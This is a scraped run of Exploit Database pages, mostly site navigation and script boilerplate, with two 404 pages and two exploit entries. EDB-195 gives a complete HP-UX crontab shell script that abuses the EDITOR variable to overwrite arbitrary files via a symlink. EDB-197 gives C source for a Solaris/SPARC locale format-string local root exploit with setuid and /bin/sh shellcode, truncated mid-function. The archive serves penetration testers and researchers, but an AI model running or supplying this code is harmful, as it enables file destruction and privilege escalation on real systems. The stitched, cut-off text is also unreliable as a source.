(!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 194
404 Page Not Found | Exploit Database#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIED404Page Not FoundThe page you are looking for could not be found.HomeGHDBPapersShellcodesExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 195
HP-UX 11.00/10.20 crontab - Overwrite Files - HP-UX dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDHP-UX 11.00/10.20 crontab - Overwrite FilesEDB-ID:195CVE:2000-0972EDB Verified:Author:dubheType:dosExploit:/Platform:HP-UXDate:2000-11-19Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/bin/sh##  HP-UX 11.00/10.20 crontab##  Kyong-won,Cho##             dubhe@hackerslab.com##  Usage : ./crontab.sh <distfile>#if [ -z "$1" ]thenecho "Usage : $0 <distfile>"exitficat << _EOF_ > /tmp/crontab_exp#!/bin/shln -sf $1 \$1_EOF_chmod 755 /tmp/crontab_expEDITOR=/tmp/crontab_expexport EDITORcrontab -e 2> /tmp/crontab$$grep -v "error on previous line" /tmp/crontab$$rm -f /tmp/crontab_exp /tmp/crontab$$# milw0rm.com [2000-11-19]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 196
404 Page Not Found | Exploit Database#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIED404Page Not FoundThe page you are looking for could not be found.HomeGHDBPapersShellcodesExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 197
Solaris/SPARC 2.7 / 7 locale - Format String - Solaris local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSolaris/SPARC 2.7 / 7 locale - Format StringEDB-ID:197CVE:2000-0844EDB Verified:Author:Solar EclipseType:localExploit:/Platform:SolarisDate:2000-11-20Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Exploit for the locale format string vulnerability in Solaris/SPARC 2.7 / 7Based on the exploit by Warning3 <warning3@nsfocus.com>For additional information see http://www.phreedom.org/solar/locale_sol.txtBy Solar Eclipse <solareclipse@phreedom.org>Assistant Editor,Phreedom Magazinehttp://www.phreedom.org10 Oct 2000*/#include <stdio.h>#include <sys/systeminfo.h>#define NUM     98          /* default number of words to dump from the stack */#define ALIGN   3           /* default align (can be 0, 1, 2, 3) */#define RETLOCOFS -16       /* default offset of the return address location */#define SHELLOFS -6         /* default offset of the jump location from the beginning of the shell buffer */#define RETLOC  0xfffffffd#define PATTERN 1024        /* format string buffer size */#define SHELL   1024        /* shell buffer size */#define NOP     0xac15a16e#define VULPROG "/usr/bin/eject"char shellcode[] =      /* from scz's funny shellcode for SPARC */"\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"  /* setuid(0)  */"\xaa\x1d\x40\x15\x90\x05\x60\x01\x92\x10\x20\x09"  /* dup2(1,2)  */"\x94\x05\x60\x02\x82\x10\x20\x3e\x91\xd0\x20\x08""\x20\x80\x49\x73\x20\x80\x62\x61\x20\x80\x73\x65\x20\x80\x3a\x29""\x7f\xff\xff\xff\x94\x1a\x80\x0a\x90\x03\xe0\x34\x92\x0b\x80\x0e""\x9c\x03\xa0\x08\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\xc0\x2a\x20\x07""\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01""\x91\xd0\x20\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff";/* get current stack point address */long get_sp(void){__asm__("mov %sp,%i0");}/* prints a long to a string */char* put_long(char* ptr, long value){*ptr++ = (char) (value >> 24) & 0xff;*ptr++ = (char) (value >> 16) & 0xff;*ptr++ = (char) (value >> 8) & 0xff;*ptr++ = (char) (value >> 0) & 0xff;return ptr;}/* check if a long contains zero bytes */int contains_zero(long value){return !((value & 0x00ffffff) &&(value & 0xff00ffff) &&(value & 0xffff00ff) 